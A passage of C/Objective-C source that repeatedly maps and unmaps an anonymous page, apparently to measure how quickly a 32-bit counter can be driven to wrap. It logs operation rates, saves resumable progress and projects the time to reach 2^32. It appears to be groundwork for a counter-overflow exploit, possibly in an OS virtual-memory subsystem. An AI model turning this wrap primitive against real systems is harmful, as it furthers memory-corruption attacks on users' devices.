        void *p = mmap(NULL, kPage, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p != MAP_FAILED) {
            munmap(p, kPage);
            n += 2;
        } else if (!first_errno) {
            first_errno = errno;
            AveLog(S(@"[vmwrap] first mmap failure: errno=%d (%s)", errno, strerror(errno)));
        }
        if ((i & 0xFFFFFF) == 0xFFFFFF) {
            clock_gettime(CLOCK_MONOTONIC, &t1);
            double el = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
            AveLog(S(@"[vmwrap] %lld ops in %.1fs (%.2f Mops/s) total %lld", n, el, n / el / 1e6, done0 + n));
            if (done0 + n >= kTarget) {
                AveLog(S(@"[vmwrap] *** 2^32 WRAP TARGET REACHED (total %lld) ***", done0 + n));
                break;
            }
            if (el >= kTimeCapSecs) {
                AveLog(@"[vmwrap] time cap reached - relaunch to continue (resumable)");
                break;
            }
        }
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    double el = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
    long long total = done0 + n;
    rs_vmwrap_save(total);
    double rate = n / el;
    double wrap_secs = 4294967296.0 / rate;
    munmap(base, kPage * 4);
    AveLog(S(@"[vmwrap] this run: %lld ops in %.1fs = %.2f Mops/s", n, el, rate / 1e6));
    AveLog(S(@"[vmwrap] total %lld ops; projected time to 2^32 on one map: %.0f s (%.1f min)",
             total, wrap_secs, wrap_secs / 60.0));
    AveSetStatus(@"vmwrap: rate measured, see the log");
    return S(@"vmwrap: %lld ops @ %.2f Mops/s; 2^32 wrap in %.1f min of churn",
              n, rate / 1e6, wrap_secs / 60.0);
}